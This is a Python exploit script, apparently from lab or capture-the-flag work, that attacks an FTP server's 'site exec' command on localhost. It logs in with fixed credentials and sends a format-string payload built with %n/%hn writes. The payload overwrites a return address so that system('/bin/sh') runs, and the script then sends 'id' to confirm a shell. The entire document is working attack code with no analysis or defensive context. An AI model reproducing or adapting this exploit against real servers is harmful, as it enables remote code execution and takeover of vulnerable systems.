#!/usr/bin/env python3

import socket
import struct

POPS = 269
PAD_BYTES = 2

BAD_CHARS = b'\x00\x09\x0a\x0d\x20\x25\x2f'

def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def has_bad_chars(msg):
    for char in msg:
        if char in BAD_CHARS:
            return True
    return False


def craft_exploit_string(pops, pad_bytes, return_addr_loc):
    # (0xffffb8c6) Pad
    exploit_str = pad_bytes * b'a'

    # (0xffffb8c8) Return addr location (lower) to write to (pop 269) (system())
    packed = struct.pack('<I', return_addr_loc)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8cc) Return addr location + 2 (higher) to write to (pop 270)
    packed = struct.pack('<I', return_addr_loc + 2)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8c8) Return addr location + 4 (whole) to write to (pop 271) (fake return)
    packed = struct.pack('<I', return_addr_loc + 4)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8c8) Return addr location + 8 (lower) to write to (pop 272) ("/bin/sh")
    packed = struct.pack('<I', return_addr_loc + 8)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8cc) Return addr location + 10 (higher) to write to (pop 273)
    packed = struct.pack('<I', return_addr_loc + 10)
    if has_bad_chars(packed): return None
    exploit_str += packed

    bytes_written = len(exploit_str)
    # ---

    # Write written bytes (doesn't matter) to pop+2, fake return addr (whole)
    exploit_str += b'%' + bytes(str(pops + 2), 'utf-8') + b'$n'

    # Write 0x048c to pop+3, lower for "/bin/sh"
    exploit_str += b'%' + bytes(str(0x048c - bytes_written), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops + 3), 'utf-8') + b'$hn'

    # Write 0xeed0 to pop, lower for system()
    exploit_str += b'%' + bytes(str(0xeed0 - 0x48c), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$hn'

    # Write 0xf7e1 to pop+1, higher for system()
    exploit_str += b'%' + bytes(str(0xf7e1 - 0xeed0), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops + 1), 'utf-8') + b'$hn'

    # Write 0xf7f4 to pop+4, higher for "/bin/sh"
    exploit_str += b'%' + bytes(str(0xf7f4 - 0xf7e1), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops + 4), 'utf-8') + b'$hn'

    return exploit_str.replace(b'\xff', b'\xff\xff')


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    s.send(b'id\n')
    response = s.recv(65535)
    if response.startswith(b'200') and not b'end of' in response:
        response += s.recv(65535)
    return response


def main():
    return_addr_guess = 0xffffb45c

    with socket.socket() as s:
        s.connect(('localhost', 21))
        banner(s)
        login(s)

        print(f'\n[*] Will be trying to write to {hex(return_addr_guess)}')
        input('Input anything to continue...')
        exploit_str = craft_exploit_string(POPS, PAD_BYTES, return_addr_guess)

        print(f'[*] Exploit crafted:')
        print(exploit_str)
        if not exploit_str:
            print(f'[*] Skipping {hex(return_addr_guess)}, has bad chars')
            return

        response = site_exec(s, exploit_str)
        print(response)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()

